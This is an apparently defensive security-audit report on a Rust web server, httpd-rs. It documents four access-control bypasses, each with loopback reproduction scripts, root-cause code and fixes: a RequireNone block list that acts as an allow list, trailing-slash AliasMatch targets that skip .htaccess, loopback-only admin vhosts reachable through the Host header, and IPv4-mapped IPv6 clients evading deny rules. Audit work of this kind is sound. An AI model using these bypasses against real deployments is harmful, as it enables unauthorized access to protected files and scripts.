# httpd-rs adversarial findings — Pass 5

**Target:** `HEAD 9a7809c` (`Add tests`), release binary
`target/release/httpd-rs` rebuilt from the checked-out tree before testing.
Repository source was not modified for this pass.

**Environment:** Linux, loopback only. Apache 2.4.69 (Debian) was used as the
differential oracle. Fixtures live under `/tmp/opencode`. No external network,
IP address, or real web server was involved.

**Status of this pass:** F46, F47, F48 and F49 were reproduced end-to-end
against the current release binary. All four are Apache differentials where the
Apache configuration is valid (`apache2 -t` says `Syntax OK`) and Apache
enforces a security policy that httpd-rs does not.

## Top exploit chains (wallet-shaped deployments)

1. **F46 — ACL inversion.** A wallet/admin directory protects itself by
   rejecting a list of networks with Apache's documented
   `<RequireNone>Require ip ...</RequireNone>` idiom. httpd-rs combines the
   providers with AND instead of OR, so a client that matches *one* blocked
   network and misses the others is let through. Any address matching at least
   one entry in a multi-network block list (the normal case for disjoint
   ranges) becomes an allowed address.
2. **F47 — protected file/script read and execution.** An administrator
   publishes a private wallet file, CGI, or PHP target with the valid regex
   alias form `AliasMatch "^/wallet$" "/srv/private/wallet.dat/"` (or
   `ScriptAliasMatch .../run.cgi/`). The trailing slash is the only difference
   from an ordinary file alias; httpd-rs skips the target directory's
   `.htaccess`, serves the static bytes, or executes the protected CGI.
3. **F48 — loopback-bound admin vhost exposure.** A normal mixed virtual-host
   layout has a wildcard `Listen 80`, a public `<VirtualHost *:80>`, and an
   administrative `<VirtualHost 127.0.0.1:80>`. httpd-rs ignores the destination
   address when selecting a virtual host. Sending `Host: admin.internal` to the
   public address selects the loopback-bound administrative document root.
4. **F49 — IP denylist bypass on dual-stack listeners.** A server listening on
   `[::]` sees IPv4 clients as `::ffff:a.b.c.d`. httpd-rs's IP matcher only
   compares IPv4-to-IPv4 or IPv6-to-IPv6, so an IPv4 client is never seen as
   belonging to an IPv4 `Require not ip` network. A deny rule such as
   `Require not ip 127.0.0.0/8` therefore allows the very clients it is meant
   to block.

## Findings at a glance

| ID | Severity | Area | Demonstrated impact | Preconditions |
|---|---|---|---|---|
| F46 | Critical | `<RequireNone>` evaluation | Multi-provider block list becomes an allow list; protected resource served | Apache-valid `<RequireNone>` with two or more positive providers |
| F47 | Critical | regex-file alias + `.htaccess` | target `.htaccess` bypass; protected file read; protected CGI execution | regex `AliasMatch`/`ScriptAliasMatch` replacement ending in `/` on a file target |
| F48 | High | address-specific vhosts | loopback/IP-bound admin docroot reachable through another address with attacker-controlled `Host` | wildcard listener plus address-bound vhost |
| F49 | High | IPv4-mapped IPv6 peers | IPv4 `Require not ip` rules stop matching IPv4 clients on dual-stack listeners | IPv6 wildcard listener (`[::]`) and IPv4 deny entry |

---

# F46. Critical: multi-provider `<RequireNone>` is combined with AND, turning a deny list into an allow list

## Impact

Apache's `<RequireNone>` means "fail if **any** contained provider is
satisfied". httpd-rs evaluates every child and feeds the results through
`combine_and()` before applying `require_none_result()`. A mix of one matching
and one non-matching child therefore becomes `Denied`, which
`require_none_result()` turns into `Neutral` — the exact opposite of a denial.

A common Apache-valid policy for blocking several internal or hostile networks
is:

```apache
<RequireAll>
    Require all granted
    <RequireNone>
        Require ip 10.0.0.0/8
        Require ip 172.16.0.0/12
        Require ip 192.168.0.0/16
    </RequireNone>
</RequireAll>
```

A client from `10.1.2.3` satisfies the first provider but not the other two.
Apache denies the request. httpd-rs treats the result as Neutral and the outer
`RequireAll` grants access. The same is true for every individual network in
the block list.

This is a pure authorization bypass: it does not require a local file, a
symlink, a proxy, or a writable directory. It applies to main-configuration
sections and to `.htaccess` because both go through the same `eval_node()`.

## Reproduction

```sh
D=/tmp/opencode/p5-requirenone
rm -rf "$D"; mkdir -p "$D/www"
printf 'WALLET-REQUIRENONE-SECRET\n' > "$D/www/wallet.dat"

cat > "$D/vp.conf" <<EOF
ServerRoot "$D"
Listen 127.0.0.1:19223
ServerName localhost
DocumentRoot "$D/www"
<Directory "$D/www">
  <RequireAll>
    Require all granted
    <RequireNone>
      Require ip 10.0.0.0/8
      Require ip 127.0.0.0/8
    </RequireNone>
  </RequireAll>
</Directory>
EOF

./target/release/httpd-rs -f "$D/vp.conf" -DFOREGROUND &
curl -i http://127.0.0.1:19223/wallet.dat
```

Observed from httpd-rs:

```text
HTTP/1.1 200 OK
Content-Length: 26

WALLET-REQUIRENONE-SECRET
```

Apache 2.4.69 with the identical section returns `403 Forbidden`. The policy
intends to block both `10.0.0.0/8` and loopback; a loopback request matches the
second provider, but because it does not also match the first, httpd-rs allows
it. A remote client in `10.0.0.0/8` is allowed by exactly the same asymmetry.

## Root cause

`crates/server/src/access.rs:404-412`:

```rust
RequireNode::None(items) => {
    let mut result = PolicyResult::Neutral;
    for item in items {
        result = combine_and(result, eval_node(item, req, peer, identity, env, docroot));
    }
    require_none_result(result)
}
```

`combine_and(Granted, Denied)` is `Denied`; `require_none_result(Denied)` is
`Neutral` (`crates/verified/src/lib.rs:2735-2774`). The granted child is erased
by a sibling denial before the negation is applied.

The verified theorem `require_none_never_grants` only proves that a
`<RequireNone>` subtree cannot itself produce `Granted`; it does not prove
Apache's "any child satisfied means fail" aggregation. The current tests only
use a single child:

- `crates/server/src/access.rs` tests `RequireNone` with one `Require all
  granted` and one `Require all denied`;
- `tests/config_semantics.py:439-450` and `1430-1445` also contain exactly one
  `Require ip 127.0.0.1` child.

## Remediation

Aggregate children as an OR of positive hits before negating, for example:

```rust
let mut result = PolicyResult::Neutral;
for item in items {
    result = combine_or(result, eval_node(item, ...));
}
require_none_result(result)
```

Add a verified `combine_none_inputs`/`require_none_multi` kernel if the existing
`require_none_result` is to remain the only proof boundary. Add main-config and
`.htaccess` differential cases with two providers where exactly one matches,
and with three providers where exactly two match. Both must return `403`.

---

# F47. Critical: regex alias file targets with a trailing slash skip the target `.htaccess`; protected files are served and protected CGI is executed

## Impact

The pass-4 F39 fix handles a prefix `Alias` whose target is a regular file by
mapping it as `(parent, basename)`, and handles an `AliasMatch` with a fixed
file target such as `/srv/private/wallet.dat` by deriving the parent as the
stable base. It does **not** handle the same valid Apache form when the
replacement text ends in `/`:

```apache
AliasMatch "^/wallet$" "/srv/private/wallet.dat/"
ScriptAliasMatch "^/run$" "/srv/private/secret.cgi/"
```

Apache accepts both configurations (`apache2 -t` reports `Syntax OK`) and
applies the target directory's `.htaccess`. httpd-rs stores the regex alias base
as the file itself because `prefix.ends_with('/')` is true, `map_path()` returns
`(file, "")`, and `access_root_for()` only converts prefix aliases to a
parent-directory root:

```rust
// crates/server/src/htaccess.rs:260
if alias.regex.is_none() && !alias.fs_path.is_dir() {
    return alias.fs_path.parent()...;
}
```

The regex alias branch therefore keeps a root that is a regular file. Every
ancestor directory fails `dir.starts_with(&root)`, so the target `.htaccess` is
never read. Handler selection uses the resolved target basename now (the F39
fix), so a protected CGI is not merely exposed as source: it is executed.

## Reproduction A: protected static file read

```sh
D=/tmp/opencode/p5-aliasmatch-file
rm -rf "$D"; mkdir -p "$D/www" "$D/private"
printf 'WALLET-ALIASMATCH-FILE-SECRET\n' > "$D/private/wallet.dat"
printf 'Require all denied\n' > "$D/private/.htaccess"

cat > "$D/vp.conf" <<EOF
ServerRoot "$D"
Listen 127.0.0.1:19219
ServerName localhost
DocumentRoot "$D/www"
<Directory "$D/private">
  AllowOverride All
</Directory>
AliasMatch "^/wallet\$" "$D/private/wallet.dat/"
EOF

./target/release/httpd-rs -f "$D/vp.conf" -DFOREGROUND &
curl -i http://127.0.0.1:19219/wallet
```

Observed from httpd-rs:

```text
HTTP/1.1 200 OK
Content-Length: 30

WALLET-ALIASMATCH-FILE-SECRET
```

Apache returns `403 Forbidden` for the same configuration because it reads
`/tmp/opencode/p5-aliasmatch-file/private/.htaccess`.

## Reproduction B: protected CGI execution

```sh
D=/tmp/opencode/p5-scriptaliasmatch-file
rm -rf "$D"; mkdir -p "$D/www" "$D/private"
cat > "$D/private/secret.cgi" <<'EOF'
#!/bin/sh
printf 'Content-Type: text/plain\r\n\r\n'
printf 'WALLET-SCRIPTALIASMATCH-SECRET\n'
EOF
chmod 755 "$D/private/secret.cgi"
printf 'Require all denied\n' > "$D/private/.htaccess"

cat > "$D/vp.conf" <<EOF
ServerRoot "$D"
Listen 127.0.0.1:19221
ServerName localhost
DocumentRoot "$D/www"
<Directory "$D/private">
  AllowOverride All
</Directory>
ScriptAliasMatch "^/run\$" "$D/private/secret.cgi/"
EOF

./target/release/httpd-rs -f "$D/vp.conf" -DFOREGROUND &
curl -i http://127.0.0.1:19221/run
```

Observed from httpd-rs:

```text
HTTP/1.1 200 OK

WALLET-SCRIPTALIASMATCH-SECRET
```

Apache 2.4.69 returns `403 Forbidden`. This is arbitrary execution of a CGI
that the administrator explicitly protected in its own directory, not merely a
source disclosure.

## Root cause

1. `crates/server/src/config.rs:585-614` — `Alias::regex()` keeps the whole
   prefix as the alias base whenever the replacement ends in `/`; if that
   prefix names a regular file, `fs_path` is the file.
2. `crates/server/src/server.rs:2770-2794` — the regex branch cleans the
   expanded target and returns `(a.fs_path, rel)` without the prefix branch's
   "if target is a file, split parent/basename" logic.
3. `crates/server/src/htaccess.rs:260` — the file-target-to-parent conversion
   is deliberately restricted to `alias.regex.is_none()`, based on the false
   assumption in the comment that "Regex aliases always store a directory
   base."

## Remediation

* Apply the same file-target split to regex aliases: if the resolved target is
  a regular file (or the stored base is a non-directory), use
  `(target.parent(), target.file_name())`, and make the access-file root the
  parent for every non-directory alias, not only prefix aliases.
* Derive the access-file root from the resolved alias target rather than from a
  regex/prefix distinction.
* Alternatively, reject a regex replacement whose stable prefix ends in `/`
  but resolves to a non-directory at configuration/request time. Apache accepts
  the form, so normalizing it is preferable.
* Add regression cases for `AliasMatch` and `ScriptAliasMatch` file targets
  with and without trailing slashes, with `Require all denied` in the target
  `.htaccess`, and with a CGI/php handler.

---

# F48. High: address-specific virtual hosts are not address-specific; a loopback-bound admin vhost is reachable through another address

## Impact

`Config::select_vhost()` filters virtual hosts by port only:

```rust
// crates/server/src/config.rs:9565-9570
let candidates: Vec<&VHost> = self
    .vhosts
    .iter()
    .filter(|v| v.addrs.is_empty() || v.ports.iter().any(|p| *p == 0 || *p == port))
    .collect();
```

It then selects from those candidates by the client-controlled `Host` header.
The destination local address (`local_ip`) is available at every call site but
is never passed in. Apache treats `127.0.0.1:80` and `*:80` as different
address/port buckets; a vhost bound to loopback is not eligible for a request
that arrived on a public interface. httpd-rs ignores the binding and lets
`Host: admin.internal` select the loopback vhost from the wildcard listener.

This defeats the common isolation pattern:

```apache
Listen 80

<VirtualHost 127.0.0.1:80>
    ServerName admin.internal
    DocumentRoot /srv/wallet-admin
</VirtualHost>

<VirtualHost *:80>
    ServerName www.example
    DocumentRoot /srv/public
</VirtualHost>
```

The administrative virtual host is intended to be reachable only over
loopback. A remote request to the public IP with `Host: admin.internal` is
served from `/srv/wallet-admin`.

## Reproduction

The local test uses `127.0.0.1` and `127.0.0.2` as two distinct loopback
addresses to simulate two interfaces.

```sh
D=/tmp/opencode/p5-vhost-ip
rm -rf "$D"; mkdir -p "$D/public" "$D/private"
printf 'WALLET-PUBLIC\n' > "$D/public/index.html"
printf 'WALLET-ADMIN-SECRET\n' > "$D/private/index.html"

cat > "$D/vp.conf" <<EOF
ServerRoot "$D"
Listen 0.0.0.0:19213
ServerName public.local
DocumentRoot "$D/public"
<VirtualHost 127.0.0.1:19213>
  ServerName admin.local
  DocumentRoot "$D/private"
</VirtualHost>
<VirtualHost *:19213>
  ServerName public.local
  DocumentRoot "$D/public"
</VirtualHost>
EOF

./target/release/httpd-rs -f "$D/vp.conf" -DFOREGROUND &
curl -s -H 'Host: admin.local' http://127.0.0.2:19213/
```

Observed from httpd-rs:

```text
200
WALLET-ADMIN-SECRET
```

Apache 2.4.69 with the equivalent configuration and the same request returns
`200 WALLET-PUBLIC`: the loopback-bound vhost is not eligible on `127.0.0.2`.
The reverse direction differs as well (Apache prefers the address-specific
admin vhost on `127.0.0.1` even for `Host: public.local`, while httpd-rs follows
the Host header), confirming that the entire address-specific selection rule
is missing rather than just a default-host ordering issue.

## Root cause

* `crates/server/src/config.rs:9565` — no local-address input to
  `select_vhost()`.
* Call sites pass only `local_port` and `Host`: HTTP/1.1
  (`server.rs:1101`), WebSocket (`server.rs:458`), HTTP/2 (`h2.rs:644`), and
  `--explain`/logging paths.
* `crates/server/src/tls.rs:255` — TLS vhost applicability is also port-only,
  so certificate/SNI selection has the same address ambiguity.

## Remediation

* Pass the destination local address into virtual-host selection and match it
  against each vhost's configured addresses using Apache's wildcard/`_default_`
  and IPv4/IPv6 rules.
* Keep the Apache address-specific precedence: a vhost bound to the exact
  destination address is selected before a wildcard vhost; a Host header must
  not make an address-bound vhost eligible on another address.
* Use the same selection helper for HTTP/1.1, HTTP/2, WebSocket, TLS
  certificate selection, cache keys, and logging.
* Add a differential test with a wildcard listener, a loopback-bound vhost and
  a wildcard vhost, requesting both `Host` names through both addresses. Assert
  the address binding wins as it does in Apache.

---

# F49. High: IPv4-mapped IPv6 peers bypass IPv4 `Require not ip` rules on dual-stack listeners

## Impact

On a Linux dual-stack `[::]` listener, IPv4 connections are represented as
IPv4-mapped IPv6 addresses (`::ffff:a.b.c.d`). `access::ip_in_net()` only
compares addresses of the same family:

```rust
// crates/server/src/access.rs:512-517
match (ip, net) {
    (IpAddr::V4(a), IpAddr::V4(n)) => ipv4_in_net(...),
    (IpAddr::V6(a), IpAddr::V6(n)) => ipv6_in_net(...),
    _ => false,
}
```

An IPv4 `Require not ip` entry therefore never matches an IPv4 client on the
dual-stack listener. Under the standard

```apache
<RequireAll>
    Require all granted
    Require not ip 127.0.0.0/8
</RequireAll>
```

shape, `Require not ip` returns `Neutral` instead of `Denied`, and the outer
`RequireAll` grants access. Apache normalizes the mapped address back to IPv4
and denies. `Require local` has the same mismatch (`peer.is_loopback()` is false
for `::ffff:127.0.0.1`), although that specific case fails closed rather than
open.

## Reproduction

```sh
D=/tmp/opencode/p5-ipmapped
rm -rf "$D"; mkdir -p "$D/www"
printf 'WALLET-IPMAPPED-SECRET\n' > "$D/www/index.html"

cat > "$D/vp.conf" <<EOF
ServerRoot "$D"
Listen [::]:19215
ServerName localhost
DocumentRoot "$D/www"
<Directory "$D/www">
  <RequireAll>
    Require all granted
    Require not ip 127.0.0.0/8
  </RequireAll>
</Directory>
EOF

./target/release/httpd-rs -f "$D/vp.conf" -DFOREGROUND &
curl -g -i http://127.0.0.1:19215/
```

Observed from httpd-rs:

```text
HTTP/1.1 200 OK

WALLET-IPMAPPED-SECRET
```

Apache 2.4.69 with `Listen [::]:19216` and the same `<Directory>` section
returns `403 Forbidden` for the IPv4 request, while both servers allow the same
request through `http://[::1]:19216/`.

## Root cause

* The connection peer is passed as `::ffff:a.b.c.d` from the dual-stack socket.
* `ip_in_net()` does not canonicalize mapped IPv6 to IPv4.
* `Require::Local` (`access.rs:446`) calls `peer.is_loopback()` directly, so it
  also disagrees for mapped loopback addresses.

## Remediation

* Canonicalize the peer address at the connection boundary (or at the access
  boundary) with `Ipv6Addr::to_ipv4_mapped()` / the equivalent
  `IpAddr::to_canonical()` conversion. Do this once and use the canonical form
  for `Require ip/local`, `mod_remoteip`, access logs, cache fingerprints,
  `REMOTE_ADDR`, and CGI environment values.
* Alternatively, teach `ip_in_net()` to map `IpAddr::V6(::ffff:a.b.c.d)` to
  IPv4 when the network is IPv4, and teach `Require::Local` to use the same
  canonical form.
* Add a dual-stack differential test that listens on `[::]`, connects over
  IPv4, and asserts `Require not ip <the IPv4 source/net>` denies as Apache
  does. Include `Require ip` allow-list and `Require local` cases for parity.

---

# Model and regression updates

The current verification ledger proves useful pieces but does not cover these
aggregations/identity dimensions. Add explicit obligations:

* **I43 `require_none_multi`:** `<RequireNone>` fails if *any* contained
  provider is satisfied; a granted child is never neutralized by a denied
  sibling. Add a verified `combine_none` using OR-of-hits semantics and prove
  `eval_node(None, ...) != Granted`.
* **I44 `regex_alias_file_target`:** a regex alias whose resolved target is a
  regular file maps to `(parent, basename)` and uses the parent as its
  access-file root, regardless of a trailing slash in the replacement.
* **I45 `vhost_local_address`:** virtual-host selection is a function of
  destination address and port as well as `Host`; an address-bound vhost is
  never a candidate on a different destination address.
* **I46 `canonical_peer`:** every authorization/identity decision consumes the
  canonical peer address; IPv4-mapped IPv6 is not a distinct policy identity
  from the corresponding IPv4 address.

Recommended regressions:

1. `config_semantics.py`: `RequireNone` with two positive providers where one
   matches and one does not; expect `403` in both main config and `.htaccess`.
2. `adversarial_regressions.py`: `AliasMatch`/`ScriptAliasMatch` file targets
   with and without trailing slashes, target `.htaccess` deny, static and CGI.
3. `config_semantics.py`/new harness: wildcard `Listen`, loopback-bound vhost,
   wildcard vhost, same `Host` through two local addresses; compare Apache.
4. New dual-stack test: `Listen [::]`, IPv4 client, `Require not ip` for the
   IPv4 source; expect Apache's `403`.
5. Add the four shapes above to the verification ledger's adversarial replay
   budget rather than only to static CVE triage.

---

# Notes and non-promoted review targets

The following were noticed during the pass but were not promoted to demonstrated
findings because they require either a second independent bug or an unusual
configuration:

* `CacheIgnoreQueryString On` combined with a CGI `DirectoryIndex` can make the
  cache key omit the query while the pre-dispatch dynamic-target test does not
  classify the directory (the script is selected later by internal dispatch).
  This is a potential cross-query representation leak, not reproduced here.
* Rewrite-condition file tests (`RewriteCond ... -f/-d/-s/-l`) use lexical
  `starts_with(ctx.docroot)` but do not canonicalize symlinks. An attacker who
  can place a symlink in the document root can use them as a metadata oracle
  outside the root. This is the rewrite analogue of F45; it was not exercised
  with a remote-only precondition.
* `AliasMatch`/`ScriptAliasMatch` captures are expanded with repeated
  `String::replace()` over `$0`..`$9`; a capture containing a literal `$N`
  is not recursively expanded, but this should be covered by a dedicated
  backreference test if alias rewriting grows more complex.

These are deliberately left below the demonstrated findings in priority.
